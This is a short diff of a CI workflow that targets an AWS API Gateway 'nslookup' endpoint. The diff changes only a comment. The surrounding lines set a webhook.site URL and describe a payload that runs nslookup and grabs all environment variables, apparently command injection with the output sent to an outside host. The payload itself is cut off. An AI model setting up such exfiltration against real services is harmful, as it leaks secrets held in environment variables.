@@ -25,7 +25,7 @@ jobs:
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          # PUT YOUR UNIQUE WEBHOOK.SITE URL HERE:
+          # new test
           WEBHOOK="https://webhook.site/8326a6da-11aa-45dc-98de-58b8e5a55807"
           
           # This payload runs nslookup, grabs all environment variables (env), 
